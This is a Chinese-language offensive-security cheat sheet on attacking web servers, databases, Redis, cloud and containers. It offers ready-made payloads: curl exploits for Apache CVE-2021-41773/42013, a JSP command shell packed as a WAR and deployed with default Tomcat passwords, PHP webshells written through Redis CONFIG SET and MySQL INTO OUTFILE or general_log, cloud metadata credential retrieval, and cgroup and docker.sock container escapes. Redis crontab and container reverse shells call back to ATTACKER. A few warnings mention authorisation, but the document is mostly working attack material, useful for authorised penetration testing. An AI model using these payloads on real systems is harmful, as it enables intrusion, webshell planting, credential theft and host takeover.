# middleware|中间件与运维|🏗️

## [g-nginx] Nginx——location 优先级、路径规范化与解析绕过
### [nginx-location] location 匹配优先级 | easy | 配置;路径匹配 | location;rewrite
> Nginx location 的匹配规则与优先级是绕路径、写配置、判解析行为的基础。
#### 优先级（从高到低）
1. `=` 精确匹配：`location = /x` 完全相等才命中
2. `^~` 前缀匹配：命中后不再往下查正则
3. `~` / `~*` 正则匹配：按配置文件书写顺序，第一个命中生效；`~*` 忽略大小写
4. 普通前缀匹配：取最长前缀
5. 兜底 `location /`

#### 速查表
| 写法 | 含义 | 优先级 |
| --- | --- | --- |
| `location = /x` | 精确匹配 | 1 |
| `location ^~ /x` | 前缀匹配，屏蔽正则 | 2 |
| `location ~ \.php$` | 正则匹配 | 3 |
| `location /x` | 普通前缀 | 4 |
| `location /` | 兜底 | 5 |

> [!tip] 绕过思路：先判断请求命中哪个 location。若静态 location 与 php location 可同时命中（如 `location ~ \.php` 与 `location /upload` 并存），可借解析差异把非 php 文件交到 PHP 处理。

#### 实战要点
- 正则 location 的 `\.php$` 只匹配结尾，`/upload/1.png/x.php` 是否执行取决于 `fastcgi_split_path_info` 等配置。
- `^~` 命中后正则不参与，但普通前缀 + 正则并存时正则仍可能优先于较短前缀，别只看书写顺序。
- 常见组合坑：`location / { try_files $uri $uri/ /index.php?$query_string; }` 把不存在路径全部回退到入口文件，前端路由依赖它，但也可能被利用做路径混淆。
- `merge_slashes on`（默认）把 `//` 折叠成 `/`，可清洗 WAF 绕过；关闭后 `//etc/passwd` 不归一化，配合 alias/root 配置可能产生新穿越面。

### [nginx-alias-traversal] alias 与 try_files 目录穿越 | medium | 路径穿越;配置错误 | alias;try_files
> alias 拼接路径不当可造成目录穿越；try_files 回退顺序错误可导致任意文件可读。
#### alias 穿越原理
```nginx
location /files/ {
    alias /var/www/data/;
}
```
请求 `/files../etc/passwd`（注意**不带斜杠**）时，Nginx 把 alias 值直接拼上 URI 剩余部分，`/var/www/data/../etc/passwd` 经过路径规范化后越出原目录，读取 `/etc/passwd`、源码、配置等。

满足条件：
- 请求以 `/files` 开头但不以斜杠结尾，如 `/files../x`、`/files..%2fx`。
- 目标文件在 Nginx 工作用户（www-data）可读范围。

> [!danger] 修复在配置侧：location 前缀与 alias 结尾必须成对（都带/都不带斜杠）；或改用 `root` 语义（root 与 URI 拼接天然补斜杠）。

#### try_files 误用导致包含
```nginx
location / {
    try_files $uri $uri/ /index.php;
}
```
若写成 `try_files $uri /index.php;` 且 `$uri` 可控，配合上传点/autoindex 可读到不该读的文件；更常见的变体是把用户输入直接拼进 `fastcgi_param SCRIPT_FILENAME` 造成 LFI。

> [!tip] 验证：请求 `/files..%2f..%2f..%2fetc%2fpasswd`，返回 200 且含内容即中招；alias 穿越通常返回 200 而非 404。

### [nginx-cve-2013-4547] CVE-2013-4547 空格与空字节绕过 | medium | 解析绕过;CVE | CVE-2013-4547;%20
> Nginx 请求行解析把空格/非 ASCII 字节当分隔符，造成前后端对同一 URI 解析不一致。
#### 漏洞概述
- CVE-2013-4547，影响 Nginx 0.8.41–1.4.3、1.5.0–1.5.6（1.4.4 / 1.5.7 修复）。
- 原理：Nginx 解析请求行时 `%20`（空格）与 `%00`（空字节）等字节在文件名匹配层面被特殊处理，而后端（如 PHP-FPM）按另一套规则解析，两者对同一 URI 的理解不同。

#### 典型利用
1. 上传内容为 PHP 的文件 `shell.php `（末尾带空格）或含非法字节的文件名。
2. 请求 `GET /upload/shell.php%20 HTTP/1.1`：Nginx 若把 `%20` 视为请求行分隔/终止，会命中磁盘上 `shell.php `，而 PHP-FPM 收到不含空格路径 → 按 PHP 执行。
3. 变体：`/1.gif%20/../shell.php`、`xx.php%00.png`（空字节截断）等。

> [!warn] 只对「前后端两套解析」的组合（Nginx + PHP-FPM）有效；纯静态站点不会 RCE。升级版本后所有绕过全部失效。

#### 与 merge_slashes / 路径规范化的关系
- `merge_slashes on`（默认）把 `//` 折叠为 `/`，可用来清洗畸形路径，也会掩盖真实路径。
- 请求行中多余字符（空格、`\x0b`、`%00`）被 `ngx_http_parse_request_line` 截断，是这类解析差异的总根源；审计时优先看 URI 里能否混入「分隔符字节 + 路径穿越序列」。

## [g-apache] Apache——多后缀解析、htaccess 与路径穿越
### [apache-multi-ext] 多后缀解析 shell.php.jpg | easy | 解析绕过;文件上传 | shell.php.jpg;AddType
> Apache 从右往左按「认识的扩展名」决定处理方式，`shell.php.jpg` 是否执行取决于中间扩展名是否被识别。
#### 原理
Apache 对多后缀文件名从右向左匹配已注册的 MIME/处理程序，一旦命中认识的扩展名就停止：
- `shell.php.jpg`：`.jpg` 被识别 → 按图片处理，**不执行**。
- `shell.php.xxx`：`.xxx` 不识别 → 继续向左看 `.php` → 命中 → 按 PHP 执行。

> [!danger] 经典场景：上传校验只查结尾扩展名或只过滤 `php`（双写、大小写绕过不生效时），`1.php.xxx`、`1.php.`（末尾点）、`1.php%20` 等变体即可绕过。前提是目标没把扩展名白名单收紧。

#### 相关配置
```apache
AddType application/x-httpd-php .php .phtml .php3 .php5
AddHandler application/x-httpd-php .php
```
- `.php5` `.phtml` `.php3` `.php4` 等变体常被遗忘，通常等价可执行。
- `AddType` 给扩展名注册 MIME 类型；`AddHandler` 绑定处理程序，两者都吃多后缀。

> [!tip] 探测：上传 `info.php.jpg`（内容为 `<?php phpinfo();`），访问看是否解析输出。低版本/未加固 Apache + PHP 组合命中率高。

### [apache-htaccess-cgi] .htaccess 利用与 mod_cgi | medium | 配置文件;文件上传;命令执行 | htaccess;AddType;mod_cgi
> 上传 .htaccess 可改目录级配置，把图片当 PHP 解析，或开启 CGI 让任意后缀脚本直接执行。
#### 前提
- 目录允许 `.htaccess` 生效：`AllowOverride All`（很多靶场/老环境默认）。
- 上传点允许 `.htaccess` 文件名（或可改名为该名）。

#### 核心手法
1. 图片当 PHP 解析：
```apache
AddType application/x-httpd-php .jpg
```
再传内容为 PHP 的 `shell.jpg` → 访问即执行。
2. 变体扩展名覆盖：
```apache
AddType application/x-httpd-php .png .gif .svg
```
3. 开启 CGI 执行（需 mod_cgi）：
```apache
Options +ExecCGI
AddHandler cgi-script .sh
```
上传带 shebang 的 `x.sh`：
```bash
#!/bin/sh
echo Content-Type: text/plain
echo
id
```
直接 `GET /upload/x.sh` 即可执行命令。
4. 目录内全部按 PHP 处理：
```apache
SetHandler application/x-httpd-php
```

> [!tip] PHP 5.3+ 还支持 `.user.ini`：上传 `.user.ini` 写 `auto_prepend_file=shell.jpg`，无需 Apache 配合即可实现「上传即包含」，适合 `AllowOverride None` 的环境。
> [!warn] Apache 2.4.49 之后默认收紧部分 .htaccess 指令，实战先确认 `AllowOverride` 是否真的放行，否则 .htaccess 不生效。

### [apache-cve-2021-41773] CVE-2021-41773 / CVE-2021-42013 路径穿越 | medium | 路径穿越;CVE;RCE | CVE-2021-41773;CVE-2021-42013
> Apache 2.4.49/2.4.50 的 `..` 规范化缺陷，配合 mod_cgi 直接命令执行。
#### CVE-2021-41773（2.4.49）
- 原因：路径规范化对 `..` 的校验不完整，`.%2e` 可绕过。
- 任意文件读取：
```bash
curl --path-as-is "http://target/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```
- RCE（需加载 mod_cgi / mod_cgid）：
```bash
curl --path-as-is -d 'echo;id' "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

#### CVE-2021-42013（2.4.49 / 2.4.50）
- 修复 41773 的补丁不完整，`%%32%65`（二次编码的 `%2e`）可再次绕过。
- Payload 把 `.` 全部换成 `%%32%65`：
```bash
curl --path-as-is -d 'echo;id' "http://target/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
```

#### 版本条件表
| CVE | 影响版本 | 修复版本 | 无 mod_cgi 时 |
| --- | --- | --- | --- |
| CVE-2021-41773 | 2.4.49 | 2.4.50 | 仅 LFI，可读任意文件 |
| CVE-2021-42013 | 2.4.49、2.4.50 | 2.4.51 | 仅 LFI，可读任意文件 |

> [!tip] 无 cgi 也可读配置、源码、密钥；有 cgi 时 `echo;id` 直接验证命令执行。`--path-as-is` 是 curl 必需参数，否则本地会先规范化 `.`。
> [!warn] 部分环境 `/bin/sh` 是 dash，可换 `/bin/bash -c id` 或 `sh -c id`。

## [g-iis] IIS——短文件名、分号截断与配置执行
### [iis-shortname] 8.3 短文件名猜解 | medium | 信息泄露;文件名猜解 | 8.3;shortname
> 借助 `~` 通配与响应差异，即使无法列目录也能还原服务器上的文件全名。
#### 原理
- NTFS 为长文件名生成 8.3 短名：前 6 位 + `~1` + 扩展名前 3 位，如 `BackupFile~1.ZIP`。
- IIS 对含 `*` 的 URL 做通配匹配，可利用 `GET /*~1*` 配合响应差异逐字符猜解短名。

#### 探测方法
```http
GET /a*~1*/.aspx HTTP/1.1
Host: target
```
- 命中文件 → 404（与不存在时的错误响应有差异，如状态码或长度不同）。
- 逐位扩展即可还原整个 8.3 短名；工具：IIS_shortname_Scanner、shortscan。
- IIS 6.0–7.5 常可直接列目录辅助；8.0+ 依赖错误响应差异，仍是字节级可判。

> [!tip] 用途：猜出 `backup~1.zip`、`web~1.config` 等隐藏备份/配置文件的全名后直接下载，或拿到已知文件名配合 PUT、路径穿越等其他漏洞。
> [!warn] 依赖响应差异，CDN 压缩/WAF 可能抹平特征；猜解是逐位请求，注意控制速率。

### [iis-semicolon] 分号截断解析 | easy | 解析绕过 | 分号;%3b
> IIS 把 `;` 之后的内容当作路径参数，`shell.asp;.jpg` 实际请求的是 `shell.asp`。
#### 原理
- IIS 对 URL 中的 `;`（编码后为 `%3b`）做截断处理，分号后的内容不参与扩展名判定。
- 常用于绕过「只允许图片扩展名上传」的过滤：传 `shell.asp;.jpg`，IIS 按 `shell.asp` 执行 ASP 代码。
- 同类变体：`%20` 空格、末尾点（`shell.asp.`）等，取决于版本与补丁。

#### Payload
```http
GET /upload/shell.asp;.jpg HTTP/1.1
```
```http
GET /upload/shell.asp%3b.jpg HTTP/1.1
```

> [!tip] 传统 IIS 6 经典玩法：`1.asp;.jpg`、`1.asp%00.jpg`（空字节截断，老版本支持）。
> [!warn] IIS 7.5+ 大部分变体已修复，只留 `;` 截断在特定处理器下可用；验证以实际响应为准，先探测再上传。

### [iis-webconfig-put] web.config 配置执行与 PUT 写入 | medium | 配置文件;文件上传;WebDAV | web.config;PUT
> 能写入 web.config 就等于拿到了 IIS 7+ 的处理程序注册表，任意后缀都可执行。
#### web.config handler 手法
上传或写入 `web.config`：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="x" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />
    </handlers>
  </system.webServer>
</configuration>
```
之后内容为 aspx 代码的 `shell.jpg` 会被 PageHandlerFactory 处理并执行。
变体：换扩展名，或直接挂 asp.dll：
```xml
<add name="x" path="*.x" verb="*" modules="IsapiModule"
     scriptProcessor="C:\Windows\System32\inetsrv\asp.dll" resourceType="Unspecified" />
```

#### PUT 写入（WebDAV）
- IIS 6 默认开启 WebDAV：`PUT /shell.txt` 上传，再 `MOVE`/`COPY` 改名成 asp 执行。
```http
PUT /shell.txt HTTP/1.1
Host: target
Content-Length: 30

<%execute(request("c"))%>
```
```http
MOVE /shell.txt HTTP/1.1
Destination: http://target/shell.asp
Host: target
```
- IIS 7/7.5 默认关闭 WebDAV（需安装启用）；开启后同样可 PUT。

> [!warn] 写入受「写权限 + 脚本执行权限」双重限制；IIS 6 常犯错误是匿名用户对上传目录有写权限。
> [!tip] web.config 上传点常见于「过滤了 .aspx/.asp 的任意文件上传」，.config 往往在放行名单里；先 OPTIONS 看 Allow 是否含 PUT。

## [g-tomcat] Tomcat——manager 部署、PUT 与 AJP 协议
### [tomcat-manager] Manager 弱口令部署 WAR | easy | 弱口令;部署;getshell | manager;war
> 拿到 manager 后台即拿到 Tomcat 完全控制权：传一个 WAR 包就 RCE。
#### 入口与默认口令
- 路径：`/manager/html`（图形界面）、`/manager/text`（REST API）、`/manager/status`。
- 需要角色 `manager-gui` / `manager-script` / `manager-jmx`（在 `conf/tomcat-users.xml` 定义）。
- 常见弱口令：
| 用户名 | 密码 | 备注 |
| --- | --- | --- |
| tomcat | tomcat | 经典默认 |
| admin | admin | 靶场常见 |
| tomcat | s3cret | 应急默认口令 |
| manager | manager | — |
| role1 | role1 / tomcat | 老版本默认 |

#### 用 manager 部署 WAR（RCE 全流程）
1. 本地打 WAR，`shell/index.jsp` 内容（命令执行一句话）：
```jsp
<% if(request.getParameter("c")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter("c")); java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } } %>
```
```bash
cd shell && jar -cvf ../shell.war *
```
2. 登录 manager 上传部署，或 REST 方式：
```bash
curl -u tomcat:tomcat -T shell.war "http://target:8080/manager/text/deploy?path=/shell"
```
3. 访问执行：`http://target:8080/shell/index.jsp?c=id`

> [!warn] 传 WAR 前先确认角色权限；`manager-script` 角色即可用 REST 部署，图形界面反而常被禁。
> [!tip] 拿不到口令时配合任意文件读取读 `conf/tomcat-users.xml`，或找备份泄露的 `tomcat-users.xml`。

### [tomcat-put-jsp] CVE-2017-12615 PUT 写 JSP | medium | CVE;文件上传 | CVE-2017-12615;PUT
> Windows 上启用 PUT 的 Tomcat 7，用 `/`、`%20`、`::$DATA` 后缀绕过检查写 JSP。
#### 漏洞条件
- Tomcat 7.0.0–7.0.79，且运行在 **Windows**。
- `conf/web.xml` 中 default servlet 的 `readonly` 被配置为 `false`（非默认值，但靶场/老环境常见）。

#### Payload（PUT 上传 JSP 一句话）
```http
PUT /shell.jsp/ HTTP/1.1
Host: target:8080
Content-Type: application/octet-stream

<% out.println("ok"); %>
```
尾部加 `/` 即可绕过 readonly 检查；其他变体：
- `PUT /shell.jsp%20`（空格）
- `PUT /shell.jsp::$DATA`（NTFS 数据流）

#### 验证
```bash
curl -X PUT --data-binary '@/tmp/s.jsp' "http://target:8080/shell.jsp/"
curl "http://target:8080/shell.jsp"
```

> [!warn] 默认配置 readonly=true 不受影响。先 `OPTIONS /` 看 Allow 是否含 PUT，或直接试一个 PUT 看响应码再决定。
> [!tip] `::$DATA` 只适用于 Windows；Linux 上用 `/` 或 `%20` 变体。

### [tomcat-ajp-ghostcat] CVE-2020-1938 Ghostcat AJP 文件读取 | medium | CVE;协议;LFI | CVE-2020-1938;Ghostcat;8009
> 暴露的 AJP（8009）端口可越权读 WEB-INF/web.xml，配合上传点可升级为 RCE。
#### 漏洞概述
- CVE-2020-1938 Ghostcat，影响 Tomcat 6/7/8/9：9.0.0.M1–9.0.30、8.5.0–8.5.50、7.0.0–7.0.99。
- AJP 协议（默认端口 8009）存在请求属性可控缺陷：构造 `javax.servlet.include.request_uri` 等属性可把任意文件路径交给 Servlet 处理 → 任意文件读取。

#### 利用
```bash
# 读取 WEB-INF/web.xml（默认），可指定任意文件
python3 ghostcat.py -p 8009 -f WEB-INF/web.xml http://target
```
- LFI 可读 web.xml / 源码 / 配置；拿到应用绝对路径后，配合可写目录上传 JSP，或利用 `allowCustomServlet` 请求属性执行 JSP（RCE 变体）。

#### 版本与修复
| 版本线 | 受影响 | 修复版本 |
| --- | --- | --- |
| 9.0.x | ≤ 9.0.30（含 M1 起） | 9.0.31 |
| 8.5.x | ≤ 8.5.50 | 8.5.51 |
| 7.0.x | ≤ 7.0.99 | 7.0.100 |

> [!danger] 修复：不用 AJP 就注释掉 `Connector port="8009"`；必须用则设置 `secretRequired="true"` 与随机 `secret` 并仅绑定内网。
> [!tip] 探测：`nmap -p 8009 target` 开放即可能中招；很多环境 8009 默认开放且无 secret。

## [g-redis] Redis——未授权访问到 RCE 全家桶
### [redis-unauth] 未授权访问 | easy | 未授权访问;弱口令 | 6379;空口令
> Redis 无口令或弱口令即可连上读写任意键、改配置，是后续所有利用的入口。
#### 确认
```bash
redis-cli -h 1.2.3.4 -p 6379
info              # 有回显即未授权或口令已知
keys *            # 枚举所有键
CONFIG GET dir    # 看数据目录与权限
```
- 未授权：直接连上无需认证（`requirepass` 未设置）。
- 弱口令：`redis-cli -a 123456`、`redis-cli -a redis`、`redis-cli -a foobared`（默认示例密码）等逐个尝试。

> [!tip] 批量探测：`nmap -p 6379 --script redis-info 1.2.3.4/24`。
> [!warn] 只读枚举（info/keys）无危害；下面写文件与主从利用属真实写入，确认目标在测试范围内再执行。

### [redis-write-file] CONFIG SET 写 Webshell / SSH key / crontab | medium | 写入;getshell;反弹 | config set;dbfilename;webshell
> 有未授权写权限时，把 RDB 数据文件写到 web 根、SSH 目录或计划任务，实现 getshell。
#### 写 Webshell（需知道 web 绝对路径，redis 用户可写）
```bash
redis-cli -h TARGET
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<?php @eval($_POST['c']);?>"
SAVE
```
访问 `http://target/shell.php`。
- 前提：web 目录对运行 redis 的账号可写；先 `CONFIG GET dir` 看当前目录、`info` 看系统信息。
- 高版本 Redis 限制 `dir` 可写范围（如 `/var/lib/redis` 内），此时看该目录下有无可写点（如 `.ssh`）。

#### 写 SSH 公钥（redis 以 root 运行）
```bash
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/k
cat /tmp/k | redis-cli -h TARGET -x set pub
redis-cli -h TARGET
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SAVE
ssh -i ~/.ssh/id_rsa root@TARGET
```

#### 写 crontab（CentOS / 多数 Linux）
```bash
redis-cli -h TARGET
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SET x "\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n"
SAVE
# Ubuntu 路径为 /var/spool/cron/crontabs/
```
然后 `nc -lvnp 4444` 等一分钟收 shell。

> [!danger] 所有写文件手法都被「redis 进程权限 + 目录可写 + 绝对路径已知」三条件约束；写 crontab 需要 redis 以 root 运行。写库前先 `CONFIG GET dir/dbfilename` 确认，避免覆盖原数据导致服务故障。

### [redis-master-slave] 主从复制加载 .so RCE | hard | 未授权访问;RCE;加载模块 | rogue-server;MODULE LOAD
> 伪造恶意 Redis 主库，让目标同步加载恶意 .so 模块实现任意命令执行。
#### 原理与适用
- Redis 4.x/5.x 支持 `MODULE LOAD` 加载动态模块；主从复制（`SLAVEOF` + `FULLRESYNC`）会原样传输数据文件。
- 攻击者运行「恶意主库」工具（redis-rogue-server / redis-rce），目标执行 `SLAVEOF attacker:port` 后同步下载恶意 .so，再 `MODULE LOAD` 加载 → `system.exec("id")` 任意命令。

#### 利用流程
```bash
# 1. 工具化一键攻击（自动完成 SLAVEOF + 传输 + 加载）
python3 redis-rogue-server.py --rhost TARGET --lhost ATTACKER

# 2. 手动等价流程
redis-cli -h TARGET
SLAVEOF ATTACKER 21000        # 连恶意主库
MODULE LOAD /tmp/exp.so       # 加载同步下来的模块
system.exec "id"
```

#### 限制
- 目标必须能**主动回连**攻击机端口（出网 TCP），NAT/防火墙后难用。
- Redis 6+ 默认限制 `MODULE LOAD`（需配置/ACL）；部分环境 `SLAVEOF` 前被 requirepass 拦。

> [!warn] 主从攻击会在目标留下模块文件与复制配置，清理需 `MODULE UNLOAD`、`SLAVEOF NO ONE`；高强度环境慎用。
> [!tip] 先 `info` 看版本与权限，root + 可写目录优先走文件写入，写不动再考虑主从模块。

## [g-db] MySQL 与数据库——弱口令、写马与日志
### [mysql-weak-outfile] root 弱口令与 INTO OUTFILE 写马 | medium | 弱口令;写马;secure_file_priv | outfile;load_file
> root/空、root/123456 等弱口令连上后，FILE 权限 + 已知路径即可把 shell 写进 web 根。
#### 连接与确认
```bash
mysql -h TARGET -u root -p
# 弱口令表：root 空 / root / 123456 / root123 / toor
SELECT VERSION();
SHOW VARIABLES LIKE 'secure_file_priv';   -- NULL 禁止导出；空串不限制；路径则仅限该路径
SELECT @@global.secure_file_priv;
```

#### INTO OUTFILE 写马
```sql
SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php echo shell_exec($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php';
```
读文件：
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/index.php');
```

#### 必要条件（四条全满足）
1. 账号有 `FILE` 权限（root 默认；普通用户 `SHOW GRANTS` 确认）。
2. `secure_file_priv` 允许目标目录（空串或指向 web 目录）。
3. 知道站点绝对路径（phpinfo / 报错回显 / 配置泄露 / 目录爆破）。
4. 目标目录对 mysqld 进程可写。

> [!warn] MySQL 5.7+ 默认 `secure_file_priv=NULL` 直接禁导出，遇此改走 general_log 手法。
> [!tip] 路径猜不到时结合 `@@datadir`、`@@basedir` 与报错页面找绝对路径；构造 `DUPLICATE` 报错可回显当前目录。

### [mysql-general-log] general_log 日志写马 | medium | 日志写马;secure_file_priv 绕过 | general_log;general_log_file
> 把通用查询日志指到 web 目录，任意 SQL 语句都会成为日志内容，一行 SQL 即一行马。
#### 利用流程（需 SUPER/root 权限）
```sql
mysql -h TARGET -u root -p
SET global general_log = 'ON';
SET global general_log_file = '/var/www/html/shell.php';
SELECT '<?php @eval($_POST[c]);?>';
-- 完成：访问 http://target/shell.php
-- 清理
SET global general_log = 'OFF';
```

#### 特点
- **不依赖 secure_file_priv**（日志写入不走导出限制），是 outfile 被 NULL 禁止时的首选绕过。
- 需要 `SUPER` 权限（root 默认），且目标目录可写、绝对路径已知。
- 日志会积累大量查询内容，马体可能被夹杂注释与报错，建议用闭合良好的一句话并尽快访问；用完恢复 `general_log_file` 原路径并关闭开关。

> [!danger] 开启期间所有语句都进文件，写马前后用 `SET global general_log='OFF'` 收尾，避免污染与被发现。
> [!tip] 同理 `slow_query_log` 也可指向任意文件，原理一致，可当备选方案。

### [phpmyadmin] phpMyAdmin 弱口令与利用 | easy | 弱口令;管理后台;写马 | pma;CVE-2018-12613
> pma 后台弱口令直连 MySQL，等于拥有图形化 SQL 终端，写马读文件一步到位。
#### 入口与弱口令
- 路径：`/phpmyadmin/`、`/pma/`、`/db/` 常见。
- 弱口令：`root` 空、`root:root`、`root:123456`、`admin:admin`、`test:test` 等。
- 登录后「SQL」选项卡即可执行任意 SQL。

#### 写马三板斧
1. `SELECT ... INTO OUTFILE`（条件同 mysql-weak-outfile）。
2. general_log 指向 web 目录（同 mysql-general-log）。
3. 高版本 LFI（CVE-2018-12613，影响 4.8.0–4.8.1）：
```
index.php?target=db_sql.php%253f/../../../../etc/passwd
```
可读任意文件，配合拿配置、密钥；部分版本无需登录即可测。

> [!warn] pma 所在机器可能与数据库不同主机，先 `SELECT @@hostname, @@datadir, @@basedir` 确认目标路径归属。
> [!tip] 找不到口令先试空密码；4.8.1 以下的 LFI 无需登录也可直接测 target 参数。

## [g-cloud] 云与容器——元数据、对象存储与逃逸
### [cloud-metadata] 云元数据服务利用 | medium | 云元数据;SSRF;凭证泄露 | 169.254.169.254;metadata
> 通过 SSRF 打 169.254.169.254 拉取 IAM 临时凭证，是云上第一利用面。
#### 各云元数据地址与要求
| 云 | 地址 | 额外要求 |
| --- | --- | --- |
| AWS | `http://169.254.169.254/latest/meta-data/` | IMDSv2 需先 `PUT /latest/api/token` 取 `X-aws-ec2-metadata-token` |
| 阿里云 | `http://100.100.100.200/latest/meta-data/` | 无 |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | 头 `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | 头 `Metadata: true` |

#### 取临时凭证（AWS / 阿里云）
```bash
# AWS：先列角色名再取凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
# 返回 AccessKeyId / SecretAccessKey / Token

# 阿里云
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<RoleName>
curl http://100.100.100.200/latest/meta-data/user-data/
```

#### 绕过思路（元数据地址被过滤时）
- 十进制 IP：`2852039166`；域名变体 `169.254.169.254.nip.io`、`metadata`。
- DNS rebinding / 302 跳转 / 短链接；SSRF 支持非 HTTP 协议时用 `gopher://` 直打。
- 只拦字面 IP 可试 `http://[::ffff:169.254.169.254]/`。

> [!danger] 拿到的凭证可审计云上存储、数据库与服务，属高危凭证泄露——测试目的明确，勿越权外泄数据。
> [!tip] 凭证有效性验证：AWS `aws sts get-caller-identity`；阿里云 `aliyun sts GetCallerIdentity`。

### [cloud-oss-bucket] 对象存储桶未授权 | easy | 对象存储;未授权;信息泄露 | oss;s3;bucket
> 桶策略配错（公共读/写）导致匿名列目录、下文件甚至覆盖上传，是云上最常见的暴露面。
#### 探测
```bash
# AWS S3
curl "https://BUCKET.s3.amazonaws.com/?list-type=2"
# 阿里云 OSS（region 替换）
curl "https://BUCKET.oss-cn-hangzhou.aliyuncs.com/?list-type=2"
# 腾讯云 COS
curl "https://BUCKET.cos.ap-shanghai.myqcloud.com/?list-type=2"
```
- 返回 200 + 对象清单 → 公共读（可下载）；403/NoSuchBucket → 私有或不存在。
- 路径式访问：`https://s3.<region>.amazonaws.com/BUCKET/`。

#### 利用
1. **公共读**：列对象名 → 下载源码/备份/env/密钥文件做深度利用。
2. **公共写**：上传恶意文件；若桶绑定了可解析域名对接 CDN/静态站点，可 getshell 或投毒（替换 JS 做存储型 XSS）。
3. **子域名接管**：云解析记录残留 + 桶已删除 → 注册同名桶接管该子域（供应链攻击面）。

> [!warn] 只读枚举相对安全；公共写/接管类操作影响面大，务必先确认授权边界再动。
> [!tip] 域名枚举：证书透明度搜 `*.s3` / `*.oss` 别名，辅以 bucket 字典爆破常见桶名（bucket-finder 等）。

### [container-escape-k8s] 容器逃逸思路与 K8s 简述 | hard | 容器逃逸;提权;K8s | privileged;docker.sock;cgroup
> 高权限容器可通过宿主磁盘、cgroup release_agent、docker.sock 逃逸到宿主 root。
#### 逃逸前置检查
```bash
cat /proc/1/cgroup          # 含 docker/kubepods 说明在容器
ls -la /.dockerenv          # 存在即容器
capsh --print               # 看 CAP_SYS_ADMIN / CAP_SYS_PTRACE
grep CapEff /proc/self/status  # 计算 CapEff 是否含 CAP_SYS_ADMIN(0x2000000)
mount | grep -E 'docker.sock|/dev/sd'   # 挂了宿主机敏感资源？
fdisk -l                    # privileged：能看到宿主机磁盘
```

#### 常见利用
1. **privileged 挂盘**：
```bash
mkdir /tmp/h && mount /dev/sda1 /tmp/h && chroot /tmp/h bash
# 写 /tmp/h/etc/cron.d/x 或修改 authorized_keys，反弹宿主 shell
```
2. **cgroup v1 release_agent**（有 CAP_SYS_ADMIN）：
```bash
mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c
echo 1 > /tmp/c/notify_on_release
host_path=$(sed -n 's/.*perdir=\([^,]*\).*/\1/p' /proc/self/mountinfo)
echo "$host_path/cmd" > /tmp/c/release_agent
echo '#!/bin/sh' > /tmp/cmd
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /tmp/cmd
chmod +x /tmp/cmd
echo $$ > /tmp/c/cgroup.procs   # 触发 release 执行
```
3. **docker.sock 挂载**：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host bash
# 或 curl --unix-socket /var/run/docker.sock POST /containers/create 挂载宿主 /
```
4. 其他：CAP_SYS_PTRACE 注入宿主进程、runC CVE-2019-5736、Dirty Pipe / OverlayFS 内核洞（版本相关）。

#### K8s 简述
- 容器内默认挂 SA token：`/var/run/secrets/kubernetes.io/serviceaccount/{token,ca.crt,namespace}`。
- 用 token 打 API：`curl -k -H "Authorization: Bearer $(cat token)" https://kubernetes.default.svc/api/v1/...`；先 `kubectl auth can-i --list` 看权限。
- 高危配置：RBAC 允许 `create pods`（可建 hostPath 挂载 / 的 pod 逃逸）、匿名绑定 cluster-admin、dashboard 未授权、kubelet 10250 未授权 exec、ETCD 2379 无鉴权泄全部 secret。
- 常规链：拿 pod → 逃逸到 node root → 偷 node token/凭证 → 横向控制集群。

> [!danger] 逃逸即宿主提权，属高危操作：先认清单点授权，逃逸后不碰沙箱外数据，留记录取证。
> [!tip] 云上 K8s（EKS/GKE/ACK）拿到 node 后可顺手打同一 VPC 的元数据服务与对象存储。

## [g-cve] 常见 CVE 速查表
### [cve-struts-weblogic] Struts2 与 WebLogic 速查 | medium | CVE;反序列化;OGNL | S2-045;S2-046;CVE-2020-2725;CVE-2020-14882
> Java 中间件两大出血点：Struts2 OGNL 注入与 WebLogic 反序列化/后台绕过。
#### Struts2
| 漏洞 | CVE | 触发条件 | 利用方式 |
| --- | --- | --- | --- |
| S2-045 | CVE-2017-5638 | Struts 2.3.5–2.3.31、2.5–2.5.10，使用 Jakarta Multipart 解析上传 | 在 `Content-Type` 头注入 OGNL 表达式执行命令 |
| S2-046 | CVE-2017-5638 | 同上版本范围，上传请求 filename 字段可控 | 在 `Content-Disposition` 的 filename 中注入 OGNL 执行命令 |

S2-045 Payload 片段（Content-Type）：
```http
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...
(#cmd='id').(#is=@java.lang.Runtime@getRuntime().exec(#cmd))...}
```

#### WebLogic
| 漏洞 | CVE | 触发条件 | 利用方式 |
| --- | --- | --- | --- |
| WLS 反序列化 | CVE-2020-2725 | 10.3.6.0.0 / 12.1.3.0.0 / 12.2.1.3.0，`/wls-wsat/CoordinatorPortType` HTTP 接口可达 | ysoserial 生成序列化 payload POST 到 wls-wsat 接口触发反序列化 RCE |
